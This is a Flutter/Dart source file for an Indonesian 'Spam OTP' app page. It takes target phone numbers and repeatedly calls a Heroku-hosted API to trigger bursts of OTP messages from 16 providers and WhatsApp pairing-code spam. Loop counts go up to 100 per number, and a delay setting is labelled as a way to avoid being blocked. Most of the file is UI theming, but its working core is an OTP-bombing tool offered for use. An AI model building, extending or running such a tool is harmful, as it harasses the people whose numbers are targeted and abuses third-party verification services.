// by @zasaco
import 'package:flutter/material.dart';
import 'dart:math';
import 'dart:async';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'app_theme.dart';

// ============================================================
//  🎨 CARTOON COLORS — ADAPTIVE ke AppTheme (3 STYLE)
// ============================================================
class CartoonColors {
  static bool get _isComic =>
      AppTheme.currentStyle.value == ThemeStyle.comic3d;
  static bool get _isHud =>
      AppTheme.currentStyle.value == ThemeStyle.hudTactical;

  static AppPalette get _C => AppTheme.current.value;

  static Color get bgMain =>
      _isComic ? _C.bg : (_isHud ? _C.hudBg() : _C.bgDeep);
  static Color get bgCard =>
      _isComic ? _C.bgDark : (_isHud ? _C.hudPanel() : _C.bgDark);
  static Color get textMain => _isComic
      ? _C.comicText
      : (_isHud ? _C.hudText() : _C.text);
  static Color get textSub => _isComic
      ? _C.comicTextSub
      : (_isHud ? _C.hudTextDim() : _C.textSub);
  static Color get textMuted =>
      _isComic ? _C.comicTextMuted : _C.textSub;
  static Color get outline =>
      _isComic ? Colors.black : (_isHud ? _C.hudBorder() : Colors.black);
  static Color get successGreen =>
      _isComic ? _C.primaryHi : (_isHud ? _C.hudSuccess() : const Color(0xFF22C55E));
  static Color get dangerPink =>
      _isComic ? _C.primaryHi : (_isHud ? _C.hudWarning() : const Color(0xFFEF4444));
  static Color get warningYellow =>
      _isComic ? _C.accent : (_isHud ? _C.accent : const Color(0xFFFBBF24));
  static Color get btnBlueLight =>
      _isComic ? _C.accent : (_isHud ? _C.accent : const Color(0xFF38BDF8));
  static Color get btnBlueDark =>
      _isComic ? _C.primary : (_isHud ? _C.accentHi : const Color(0xFF1E40AF));

  static Color textOnButton(Color bg) {
    if (_isComic) return _C.contrastTextOn(bg);
    return Colors.white;
  }

  static Color get textOnInput =>
      _isComic ? Colors.black : (_isHud ? _C.hudText() : textMain);
  static Color get textOnCard => _isComic ? _C.comicText : textMain;

  static String get fontFamily {
    if (_isComic) return 'Bangers';
    return 'Orbitron';
  }
  static String get fontFamilySub {
    if (_isComic) return 'ComicNeue';
    return 'ShareTechMono';
  }
}

// ============================================================
//  SPAM OTP PAGE
// ============================================================
class SpamOTPPage extends StatefulWidget {
  const SpamOTPPage({super.key});
  @override
  State<SpamOTPPage> createState() => _SpamOTPPageState();
}

class _SpamOTPPageState extends State<SpamOTPPage> {
  static const String _kBase =
      'https://spamotp-api-eef5f0834c07.herokuapp.com';

  final TextEditingController phoneController = TextEditingController();

  bool isRunning = false;
  bool shouldStop = false;
  int totalSuccess = 0;
  int totalError = 0;
  int totalRequests = 0;
  int currentLoop = 0;
  int totalLoops = 10;
  int delayMs = 1000;
  String currentStatus = 'Menunggu...';
  double progress = 0.0;
  List<String> logs = [];
  bool isBannedMode = false;
  final ScrollController _logScrollController = ScrollController();

  final Random _random = Random();

  String _normalizePhone(String phone) {
    String cleaned = phone.replaceAll(RegExp(r'[^0-9+]'), '');
    if (cleaned.startsWith('+')) return cleaned.replaceFirst('+', '');
    if (cleaned.startsWith('0')) return '62${cleaned.substring(1)}';
    return cleaned;
  }

  Future<List<Map<String, dynamic>>> _getOTPEndpoints(String phone) async {
    final String basePhone = phone.startsWith('62') ? phone : '62$phone';
    try {
      await http
          .get(Uri.parse('$_kBase/health'))
          .timeout(const Duration(seconds: 10));
    } catch (_) {
      _addLog('⚠️ Server sedang tidak merespons, coba lagi nanti', type: 'info');
    }

    return [
      {
        'url': '$_kBase/api/$basePhone?mode=single',
        'method': 'GET',
        'label': 'OTP Burst 16 Provider',
      },
      {
        'url': '$_kBase/api/$basePhone?mode=pairing',
        'method': 'GET',
        'label': 'Pairing WA Spam',
      },
    ];
  }

  Future<bool> _sendRequest(Map<String, dynamic> endpoint, int delayMs) async {
    if (isBannedMode) {
      await Future.delayed(
          Duration(milliseconds: isRunning ? delayMs ~/ 3 : delayMs));
      return true;
    }

    await Future.delayed(Duration(milliseconds: delayMs));

    try {
      final uri = Uri.parse(endpoint['url']);
      final response = await http.get(uri).timeout(
        const Duration(seconds: 15),
        onTimeout: () => http.Response('{"status":"timeout"}', 408),
      );

      if ([200, 201, 202].contains(response.statusCode)) {
        try {
          final data = jsonDecode(response.body);
          if (data is Map<String, dynamic>) {
            if (data['success'] == true) return true;
            if (data['status'] == 'running') return true;
            if (data['status'] == 'ok') return true;
          }
        } catch (_) {}
        return true;
      }
      return false;
    } catch (e) {
      return false;
    }
  }

  void _addLog(String message, {String type = 'info'}) {
    String time = DateTime.now().toString().substring(11, 19);
    setState(() {
      logs.add('[$time] $message');
      if (logs.length > 500) logs.removeAt(0);
    });
    _scrollToBottom();
  }

  void _scrollToBottom() {
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (_logScrollController.hasClients) {
        _logScrollController.animateTo(
          _logScrollController.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200),
          curve: Curves.easeOut,
        );
      }
    });
  }

  Future<void> _startSpam() async {
    if (isRunning) return;

    String phoneRaw = phoneController.text.trim();
    if (phoneRaw.isEmpty) {
      _addLog('❌ Masukkan nomor target!', type: 'error');
      return;
    }

    List<String> phones = phoneRaw
        .split(',')
        .map((p) => p.trim())
        .where((p) => p.isNotEmpty)
        .toList();

    if (phones.isEmpty) {
      _addLog('❌ Masukkan minimal 1 nomor!', type: 'error');
      return;
    }

    for (int i = 0; i < phones.length; i++) {
      phones[i] = _normalizePhone(phones[i]);
    }

    setState(() {
      isRunning = true;
      shouldStop = false;
      totalSuccess = 0;
      totalError = 0;
      totalRequests = 0;
      currentLoop = 0;
      progress = 0.0;
      currentStatus = 'Memulai spam...';
    });

    var endpoints = await _getOTPEndpoints(phones[0]);
    int totalPhones = phones.length;
    int totalJobs = totalPhones * totalLoops * endpoints.length;
    int currentJob = 0;

    _addLog('🚀 Spam ke ${phones.length} nomor ($totalLoops× masing-masing)');
    _addLog('📡 API: $_kBase');
    _addLog('🔌 ${endpoints.length} mode tersedia');

    if (isBannedMode) {
      _addLog('🚫 BANNED MODE: Simulasi aktif', type: 'banned');
    }

    for (int p = 0; p < phones.length; p++) {
      if (shouldStop) {
        _addLog('🛑 Dihentikan!', type: 'error');
        break;
      }

      String phone = phones[p];
      setState(() {
        currentStatus = '📞 Memproses: $phone (${p + 1}/${phones.length})';
      });

      for (int loop = 1; loop <= totalLoops; loop++) {
        if (shouldStop) break;
        int loopSuccess = 0;
        int loopError = 0;

        for (int i = 0; i < endpoints.length; i++) {
          if (shouldStop) break;

          bool result = await _sendRequest(endpoints[i], delayMs);

          if (result) {
            loopSuccess++;
            totalSuccess++;
          } else {
            loopError++;
            totalError++;
          }
          totalRequests++;
          currentJob++;

          if (mounted) {
            setState(() {
              progress = (currentJob / totalJobs) * 100;
              currentLoop = loop;
            });
          }

          _addLog(
            '📞 $phone | Lp$loop → ${endpoints[i]['label']} | ${result ? "✅" : "❌"}',
            type: isBannedMode ? 'banned' : (result ? 'success' : 'error'),
          );

          if (!shouldStop && !isBannedMode) {
            await Future.delayed(const Duration(milliseconds: 300));
          }
        }

        _addLog('📞 $phone Loop $loop selesai! ✅ $loopSuccess ❌ $loopError');
      }

      _addLog('✅ Selesai: $phone | Total ✅ $totalSuccess ❌ $totalError');
    }

    if (mounted) {
      setState(() {
        isRunning = false;
        progress = 100;
        currentStatus = '✅ Selesai! ✅ $totalSuccess ❌ $totalError';
      });
    }

    if (isBannedMode) {
      _addLog('🚫 BANNED SELESAI — Simulasi selesai', type: 'banned');
    } else {
      _addLog('🎯 SELESAI TOTAL! ✅ $totalSuccess ❌ $totalError',
          type: 'success');
    }
  }

  void _stopSpam() {
    if (isRunning) {
      setState(() => shouldStop = true);
      _addLog('🛑 Menghentikan...', type: 'error');
    }
  }

  // ═══ SHADOW HELPERS (auto 3 style) ═══
  List<BoxShadow> _shadow(double s) {
    final style = AppTheme.currentStyle.value;
    final C = AppTheme.current.value;
    if (style == ThemeStyle.comic3d) {
      return [
        BoxShadow(
            color: Colors.black, offset: Offset(s, s), blurRadius: 0),
      ];
    }
    if (style == ThemeStyle.hudTactical) {
      return [
        BoxShadow(color: C.accent.withOpacity(0.25), blurRadius: 12),
      ];
    }
    return [
      BoxShadow(
          color: Colors.black.withOpacity(0.7),
          offset: const Offset(0, 4),
          blurRadius: 8),
    ];
  }

  // ═══ PANEL DECORATION (auto 3 style) ═══
  BoxDecoration _panel({Color? color, double r = 12}) {
    final style = AppTheme.currentStyle.value;
    final C = AppTheme.current.value;
    final base = color ?? CartoonColors.bgCard;

    if (style == ThemeStyle.comic3d) {
      return BoxDecoration(
        color: base,
        borderRadius: BorderRadius.circular(r),
        border: Border.all(color: Colors.black, width: 3),
        boxShadow: _shadow(3),
      );
    }
    if (style == ThemeStyle.hudTactical) {
      return BoxDecoration(
        color: C.hudPanel(),
        border: Border.all(color: C.hudBorder(), width: 1.2),
        boxShadow: _shadow(0),
      );
    }
    return BoxDecoration(
      color: base,
      borderRadius: BorderRadius.circular(r),
      border: Border.all(color: C.accent.withOpacity(0.35), width: 1.2),
      boxShadow: _shadow(0),
    );
  }

  @override
  Widget build(BuildContext context) {
    return ValueListenableBuilder<AppPalette>(
      valueListenable: AppTheme.current,
      builder: (context, C, _) {
        return ValueListenableBuilder<ThemeStyle>(
          valueListenable: AppTheme.currentStyle,
          builder: (context, style, __) {
            final isComic = style == ThemeStyle.comic3d;
            final isHud = style == ThemeStyle.hudTactical;

            return Scaffold(
              backgroundColor: CartoonColors.bgMain,
              body: Stack(
                children: [
                  if (isComic)
                    Positioned.fill(
                      child: CustomPaint(
                        painter: _ComicHalftonePainter(
                            color: C.primaryLo.withOpacity(0.12)),
                      ),
                    ),
                  if (isHud)
                    Positioned.fill(
                      child: CustomPaint(
                        painter: _HudGridPainter(
                            color: C.hudGridLine()),
                      ),
                    ),
                  SafeArea(
                    child: Padding(
                      padding: const EdgeInsets.all(16.0),
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          _buildHeader(isComic, isHud),
                          const SizedBox(height: 6),
                          _buildApiBanner(isComic, isHud, C),
                          const SizedBox(height: 16),
                          _buildPhoneLabel(isComic),
                          const SizedBox(height: 6),
                          _buildPhoneInput(isComic, isHud, C),
                          const SizedBox(height: 4),
                          Text('Pisahkan dengan koma (,)',
                              style: TextStyle(
                                fontSize: 10,
                                color: CartoonColors.textSub
                                    .withOpacity(0.6),
                                fontFamily:
                                    CartoonColors.fontFamilySub,
                              )),
                          const SizedBox(height: 12),
                          _buildLoopDelayRow(isComic, isHud, C),
                          const SizedBox(height: 12),
                          _buildActionButtons(isComic, isHud),
                          const SizedBox(height: 12),
                          if (isRunning || progress > 0)
                            _buildProgressCard(isComic, isHud, C),
                          const SizedBox(height: 8),
                          Expanded(child: _buildLogPanel(isComic, isHud, C)),
                        ],
                      ),
                    ),
                  ),
                ],
              ),
            );
          },
        );
      },
    );
  }

  Widget _buildHeader(bool isComic, bool isHud) {
    return Row(
      children: [
        Text(
          '📱 Spam OTP',
          style: TextStyle(
            fontSize: 22,
            fontWeight: FontWeight.w900,
            color: CartoonColors.textMain,
            fontFamily: CartoonColors.fontFamily,
            letterSpacing: isComic ? 1.5 : (isHud ? 2 : 0),
            shadows: isComic
                ? [
                    const Shadow(
                        color: Colors.black,
                        offset: Offset(2, 2),
                        blurRadius: 0)
                  ]
                : (isHud
                    ? [
                        Shadow(
                            color: AppTheme.current.value.accent
                                .withOpacity(0.5),
                            blurRadius: 8),
                      ]
                    : null),
          ),
        ),
        const SizedBox(width: 8),
        Container(
          padding:
              const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
          decoration: BoxDecoration(
            color: CartoonColors.successGreen,
            borderRadius: BorderRadius.circular(isHud ? 2 : 8),
            border: Border.all(
                color: CartoonColors.outline,
                width: isComic ? 2.5 : 1.2),
            boxShadow: isComic ? _shadow(2.5) : null,
          ),
          child: Text(
            '💾 API-KU',
            style: TextStyle(
              fontSize: 10,
              color: CartoonColors.textOnButton(
                  CartoonColors.successGreen),
              fontWeight: FontWeight.w700,
              fontFamily: CartoonColors.fontFamilySub,
            ),
          ),
        ),
        if (isBannedMode)
          Container(
            margin: const EdgeInsets.only(left: 8),
            padding:
                const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
            decoration: BoxDecoration(
              color: CartoonColors.dangerPink,
              borderRadius: BorderRadius.circular(isHud ? 2 : 8),
              border: Border.all(
                  color: CartoonColors.outline,
                  width: isComic ? 2.5 : 1.2),
              boxShadow: isComic ? _shadow(2.5) : null,
            ),
            child: Text(
              '🚫 BANNED',
              style: TextStyle(
                fontSize: 10,
                color: CartoonColors.textOnButton(
                    CartoonColors.dangerPink),
                fontWeight: FontWeight.w700,
                fontFamily: CartoonColors.fontFamilySub,
              ),
            ),
          ),
      ],
    );
  }

  Widget _buildApiBanner(bool isComic, bool isHud, AppPalette C) {
    return Container(
      padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
      decoration: BoxDecoration(
        color: CartoonColors.warningYellow.withOpacity(isHud ? 0.15 : 1),
        borderRadius: BorderRadius.circular(isHud ? 2 : 8),
        border: Border.all(
            color: CartoonColors.outline,
            width: isComic ? 2.5 : (isHud ? 1.2 : 1.5)),
        boxShadow: isComic ? _shadow(2.5) : null,
      ),
      child: Text(
        '💸 Pakai API: spamotp-api-eef5f0834c07.herokuapp.com',
        style: TextStyle(
          fontSize: 11,
          color: isHud ? C.accent : CartoonColors.textOnButton(
              CartoonColors.warningYellow),
          fontWeight: FontWeight.w700,
          fontFamily: CartoonColors.fontFamilySub,
        ),
      ),
    );
  }

  Widget _buildPhoneLabel(bool isComic) {
    return Text(
      '📞 Nomor Target',
      style: TextStyle(
        fontSize: 12,
        color: CartoonColors.textSub,
        fontWeight: FontWeight.w700,
        fontFamily: CartoonColors.fontFamily,
        letterSpacing: isComic ? 1 : 0,
      ),
    );
  }

  Widget _buildPhoneInput(bool isComic, bool isHud, AppPalette C) {
    return Row(
      children: [
        Expanded(
          child: Container(
            decoration: _panel(),
            child: TextField(
              controller: phoneController,
              style: TextStyle(
                color: CartoonColors.textOnInput,
                fontWeight: FontWeight.w600,
                fontFamily: CartoonColors.fontFamilySub,
                letterSpacing: isHud ? 1 : 0,
              ),
              cursorColor: CartoonColors.successGreen,
              decoration: InputDecoration(
                hintText: '6281234567890,6289876543210',
                hintStyle: TextStyle(
                    color: CartoonColors.textSub.withOpacity(0.4),
                    fontFamily: CartoonColors.fontFamilySub),
                border: InputBorder.none,
                contentPadding: const EdgeInsets.symmetric(
                    horizontal: 16, vertical: 14),
              ),
            ),
          ),
        ),
        const SizedBox(width: 8),
        Container(
          padding:
              const EdgeInsets.symmetric(horizontal: 10, vertical: 6),
          decoration: BoxDecoration(
            color: CartoonColors.btnBlueLight.withOpacity(isHud ? 0.15 : 1),
            borderRadius: BorderRadius.circular(isHud ? 2 : 8),
            border: Border.all(
                color: CartoonColors.outline,
                width: isComic ? 2.5 : (isHud ? 1.2 : 1.5)),
            boxShadow: isComic ? _shadow(2.5) : null,
          ),
          child: Text(
            'Multi',
            style: TextStyle(
              fontSize: 10,
              color: isHud
                  ? CartoonColors.btnBlueLight
                  : CartoonColors.textOnButton(CartoonColors.btnBlueLight),
              fontWeight: FontWeight.w700,
              fontFamily: CartoonColors.fontFamilySub,
            ),
          ),
        ),
      ],
    );
  }

  Widget _buildLoopDelayRow(bool isComic, bool isHud, AppPalette C) {
    return Row(
      children: [
        Expanded(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text('🔄 Jumlah Pengiriman',
                  style: TextStyle(
                    fontSize: 12,
                    color: CartoonColors.textSub,
                    fontWeight: FontWeight.w700,
                    fontFamily: CartoonColors.fontFamilySub,
                  )),
              const SizedBox(height: 6),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 8),
                decoration: BoxDecoration(
                  color: CartoonColors.btnBlueLight.withOpacity(isHud ? 0.15 : 1),
                  borderRadius: BorderRadius.circular(isHud ? 2 : 12),
                  border: Border.all(
                      color: CartoonColors.outline,
                      width: isComic ? 3 : (isHud ? 1.2 : 1.5)),
                  boxShadow: isComic ? _shadow(3) : null,
                ),
                child: DropdownButtonHideUnderline(
                  child: DropdownButton<int>(
                    value: totalLoops,
                    dropdownColor: isHud ? C.hudPanel() : CartoonColors.bgCard,
                    style: TextStyle(
                      color: isHud
                          ? C.hudText()
                          : CartoonColors.textOnButton(
                              CartoonColors.btnBlueLight),
                      fontSize: 14,
                      fontWeight: FontWeight.w700,
                      fontFamily: CartoonColors.fontFamilySub,
                    ),
                    icon: Icon(Icons.keyboard_arrow_down,
                        color: isHud
                            ? C.accent
                            : CartoonColors.textOnButton(
                                CartoonColors.btnBlueLight)),
                    isExpanded: true,
                    items: [
                      _ddItem(1, '1×', isHud),
                      _ddItem(2, '2×', isHud),
                      _ddItem(3, '3×', isHud),
                      _ddItem(5, '5×', isHud),
                      _ddItem(10, '10×', isHud),
                      _ddItem(20, '20×', isHud),
                      _ddItem(30, '30×', isHud),
                      _ddItem(50, '50×', isHud),
                      _ddItem(100, '100×', isHud),
                      DropdownMenuItem(
                        value: 9999,
                        child: Text('🚫 BANNED SPAM',
                            style: TextStyle(
                              color: isHud
                                  ? C.hudWarning()
                                  : CartoonColors.textOnButton(
                                      CartoonColors.btnBlueLight),
                              fontWeight: FontWeight.w900,
                              fontFamily: CartoonColors.fontFamilySub,
                            )),
                      ),
                    ],
                    onChanged: isRunning
                        ? null
                        : (value) {
                            setState(() {
                              totalLoops = value!;
                              isBannedMode = (value == 9999);
                            });
                          },
                  ),
                ),
              ),
            ],
          ),
        ),
        const SizedBox(width: 12),
        Expanded(
          child: Column(
            crossAxisAlignment: CrossAxisAlignment.start,
            children: [
              Text('⏱️ Delay (ms)',
                  style: TextStyle(
                    fontSize: 12,
                    color: CartoonColors.textSub,
                    fontWeight: FontWeight.w700,
                    fontFamily: CartoonColors.fontFamilySub,
                  )),
              const SizedBox(height: 6),
              Container(
                padding: const EdgeInsets.symmetric(horizontal: 8),
                decoration: BoxDecoration(
                  color: CartoonColors.btnBlueDark.withOpacity(isHud ? 0.15 : 1),
                  borderRadius: BorderRadius.circular(isHud ? 2 : 12),
                  border: Border.all(
                      color: CartoonColors.outline,
                      width: isComic ? 3 : (isHud ? 1.2 : 1.5)),
                  boxShadow: isComic ? _shadow(3) : null,
                ),
                child: DropdownButtonHideUnderline(
                  child: DropdownButton<int>(
                    value: delayMs,
                    dropdownColor: isHud ? C.hudPanel() : CartoonColors.bgCard,
                    style: TextStyle(
                      color: isHud
                          ? C.hudText()
                          : CartoonColors.textOnButton(
                              CartoonColors.btnBlueDark),
                      fontSize: 14,
                      fontWeight: FontWeight.w700,
                      fontFamily: CartoonColors.fontFamilySub,
                    ),
                    icon: Icon(Icons.keyboard_arrow_down,
                        color: isHud
                            ? C.accent
                            : CartoonColors.textOnButton(
                                CartoonColors.btnBlueDark)),
                    isExpanded: true,
                    items: [
                      _ddItem(500, '500ms (Cepat)', isHud,
                          bgColor: CartoonColors.btnBlueDark),
                      _ddItem(1000, '1000ms (Normal)', isHud,
                          bgColor: CartoonColors.btnBlueDark),
                      _ddItem(2000, '2000ms (Aman)', isHud,
                          bgColor: CartoonColors.btnBlueDark),
                      _ddItem(3000, '3000ms (Anti Blokir)', isHud,
                          bgColor: CartoonColors.btnBlueDark),
                    ],
                    onChanged: isRunning
                        ? null
                        : (value) => setState(() => delayMs = value!),
                  ),
                ),
              ),
            ],
          ),
        ),
      ],
    );
  }

  DropdownMenuItem<int> _ddItem(int value, String text, bool isHud,
      {Color? bgColor}) {
    final bg = bgColor ?? CartoonColors.btnBlueLight;
    final C = AppTheme.current.value;
    return DropdownMenuItem(
      value: value,
      child: Text(text,
          style: TextStyle(
            color: isHud
                ? C.hudText()
                : CartoonColors.textOnButton(bg),
            fontFamily: CartoonColors.fontFamilySub,
            fontWeight: FontWeight.w700,
          )),
    );
  }

  Widget _buildActionButtons(bool isComic, bool isHud) {
    final startBg = isBannedMode
        ? CartoonColors.dangerPink
        : CartoonColors.successGreen;
    final C = AppTheme.current.value;

    return Row(
      children: [
        Expanded(
          child: _buildBigButton(
            label: isBannedMode ? '🔥 BANNED SPAM' : '🚀 Kirim',
            bg: startBg,
            onTap: isRunning ? null : _startSpam,
            isComic: isComic,
            isHud: isHud,
            C: C,
          ),
        ),
        const SizedBox(width: 10),
        Expanded(
          child: _buildBigButton(
            label: '🛑 Stop',
            bg: CartoonColors.dangerPink,
            onTap: isRunning ? _stopSpam : null,
            isComic: isComic,
            isHud: isHud,
            C: C,
          ),
        ),
      ],
    );
  }

  Widget _buildBigButton({
    required String label,
    required Color bg,
    required VoidCallback? onTap,
    required bool isComic,
    required bool isHud,
    required AppPalette C,
  }) {
    final disabled = onTap == null;
    final textColor = isHud ? bg : CartoonColors.textOnButton(bg);

    return GestureDetector(
      onTap: onTap,
      child: Container(
        height: 56,
        decoration: isHud
            ? BoxDecoration(
                color: bg.withOpacity(disabled ? 0.05 : 0.15),
                border: Border.all(
                    color: bg.withOpacity(disabled ? 0.4 : 1),
                    width: 1.4),
                boxShadow: disabled
                    ? []
                    : [
                        BoxShadow(
                            color: bg.withOpacity(0.35),
                            blurRadius: 10),
                      ],
              )
            : BoxDecoration(
                color: bg,
                borderRadius: BorderRadius.circular(12),
                border: Border.all(
                    color: CartoonColors.outline,
                    width: isComic ? 3 : 1.5),
                boxShadow: isComic ? _shadow(4) : _shadow(0),
              ),
        child: Center(
          child: Text(
            label,
            style: TextStyle(
              fontWeight: FontWeight.w900,
              fontSize: 16,
              color: disabled
                  ? textColor.withOpacity(0.5)
                  : textColor,
              fontFamily: CartoonColors.fontFamily,
              letterSpacing: isComic ? 1.5 : (isHud ? 2 : 0.5),
              shadows: isComic
                  ? [
                      Shadow(
                          color: textColor == Colors.white
                              ? Colors.black
                              : Colors.white,
                          offset: const Offset(2, 2),
                          blurRadius: 0),
                    ]
                  : null,
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildProgressCard(bool isComic, bool isHud, AppPalette C) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: _panel(r: 16),
      child: Column(
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Text('${progress.toStringAsFixed(0)}%',
                  style: TextStyle(
                    fontSize: 16,
                    fontWeight: FontWeight.w900,
                    color: CartoonColors.textOnCard,
                    fontFamily: CartoonColors.fontFamily,
                    letterSpacing: isHud ? 1.5 : 0,
                  )),
              Text('$totalRequests / ${(totalLoops * 2).toString()}',
                  style: TextStyle(
                    fontSize: 14,
                    color: CartoonColors.textSub,
                    fontWeight: FontWeight.w600,
                    fontFamily: CartoonColors.fontFamilySub,
                  )),
            ],
          ),
          const SizedBox(height: 8),
          ClipRRect(
            borderRadius: BorderRadius.circular(isHud ? 0 : 10),
            child: LinearProgressIndicator(
              value: progress / 100,
              minHeight: 12,
              backgroundColor:
                  CartoonColors.textSub.withOpacity(0.15),
              valueColor: AlwaysStoppedAnimation<Color>(isBannedMode
                  ? CartoonColors.dangerPink
                  : CartoonColors.successGreen),
            ),
          ),
          const SizedBox(height: 12),
          Row(
            children: [
              _buildStatBox('✅ Sukses', totalSuccess,
                  CartoonColors.successGreen, isComic, isHud, C),
              const SizedBox(width: 6),
              _buildStatBox('❌ Gagal', totalError,
                  CartoonColors.dangerPink, isComic, isHud, C),
              const SizedBox(width: 6),
              _buildStatBox('📡 Total', totalRequests,
                  CartoonColors.btnBlueDark, isComic, isHud, C),
            ],
          ),
          const SizedBox(height: 8),
          Text(currentStatus,
              style: TextStyle(
                fontSize: 11,
                color: CartoonColors.textSub,
                fontWeight: FontWeight.w600,
                fontFamily: CartoonColors.fontFamilySub,
              ),
              textAlign: TextAlign.center),
        ],
      ),
    );
  }

  Widget _buildLogPanel(bool isComic, bool isHud, AppPalette C) {
    return Container(
      decoration: _panel(),
      child: logs.isEmpty
          ? Center(
              child: Text('📭 Belum ada log',
                  style: TextStyle(
                    color: CartoonColors.textSub,
                    fontSize: 13,
                    fontWeight: FontWeight.w600,
                    fontFamily: CartoonColors.fontFamilySub,
                  )))
          : ListView.builder(
              controller: _logScrollController,
              padding: const EdgeInsets.all(12),
              itemCount: logs.length,
              itemBuilder: (context, index) {
                String log = logs[index];
                Color color = CartoonColors.textSub;
                if (log.contains('✅') && !log.contains('BANNED')) {
                  color = CartoonColors.successGreen;
                } else if (log.contains('❌')) {
                  color = CartoonColors.dangerPink;
                } else if (log.contains('🚫') || log.contains('BANNED')) {
                  color = CartoonColors.dangerPink;
                } else if (log.contains('🛑')) {
                  color = CartoonColors.dangerPink;
                } else if (log.contains('🎯')) {
                  color = CartoonColors.warningYellow;
                }
                return Padding(
                  padding: const EdgeInsets.symmetric(vertical: 2),
                  child: Row(
                    children: [
                      Text(log.substring(1, 9),
                          style: TextStyle(
                            fontSize: 10,
                            color: CartoonColors.textSub
                                .withOpacity(0.5),
                            fontFamily: 'monospace',
                            fontWeight: FontWeight.bold,
                          )),
                      const SizedBox(width: 6),
                      Expanded(
                        child: Text(log.substring(10),
                            style: TextStyle(
                              fontSize: 11,
                              color: color,
                              fontFamily: 'monospace',
                              fontWeight: FontWeight.w600,
                            )),
                      ),
                    ],
                  ),
                );
              },
            ),
    );
  }

  Widget _buildStatBox(String label, int value, Color color,
      bool isComic, bool isHud, AppPalette C) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 8),
        decoration: isHud
            ? BoxDecoration(
                color: color.withOpacity(0.15),
                border: Border.all(color: color, width: 1.2),
                boxShadow: [
                  BoxShadow(
                      color: color.withOpacity(0.3), blurRadius: 8),
                ],
              )
            : BoxDecoration(
                color: color,
                borderRadius: BorderRadius.circular(10),
                border: Border.all(
                    color: CartoonColors.outline,
                    width: isComic ? 2.5 : 1),
                boxShadow: isComic ? _shadow(2.5) : _shadow(0),
              ),
        child: Column(
          children: [
            Text(value.toString(),
                style: TextStyle(
                  fontSize: 20,
                  fontWeight: FontWeight.w900,
                  color: isHud
                      ? color
                      : CartoonColors.textOnButton(color),
                  fontFamily: CartoonColors.fontFamily,
                  shadows: isHud
                      ? [
                          Shadow(
                              color: color.withOpacity(0.7),
                              blurRadius: 8),
                        ]
                      : null,
                )),
            Text(label,
                style: TextStyle(
                  fontSize: 9,
                  color: isHud
                      ? color.withOpacity(0.85)
                      : CartoonColors.textOnButton(color)
                          .withOpacity(0.95),
                  fontWeight: FontWeight.w700,
                  fontFamily: CartoonColors.fontFamilySub,
                )),
          ],
        ),
      ),
    );
  }
}

// ═══════════════════════════════════════════════════════════
// COMIC HALFTONE PAINTER
// ═══════════════════════════════════════════════════════════
class _ComicHalftonePainter extends CustomPainter {
  final Color color;
  const _ComicHalftonePainter({required this.color});

  @override
  void paint(Canvas canvas, Size size) {
    const spacing = 22.0;
    final paint = Paint()..color = color;
    for (double x = 0; x < size.width + spacing; x += spacing) {
      for (double y = 0; y < size.height + spacing; y += spacing) {
        canvas.drawCircle(Offset(x, y), 2.5, paint);
      }
    }
  }

  @override
  bool shouldRepaint(_ComicHalftonePainter old) => old.color != color;
}

// ═══════════════════════════════════════════════════════════
// HUD GRID PAINTER
// ═══════════════════════════════════════════════════════════
class _HudGridPainter extends CustomPainter {
  final Color color;
  const _HudGridPainter({required this.color});

  @override
  void paint(Canvas canvas, Size size) {
    final p = Paint()
      ..color = color
      ..strokeWidth = 0.6;
    const step = 28.0;
    for (double x = 0; x < size.width; x += step) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), p);
    }
    for (double y = 0; y < size.height; y += step) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), p);
    }
  }

  @override
  bool shouldRepaint(_HudGridPainter old) => old.color != color;
}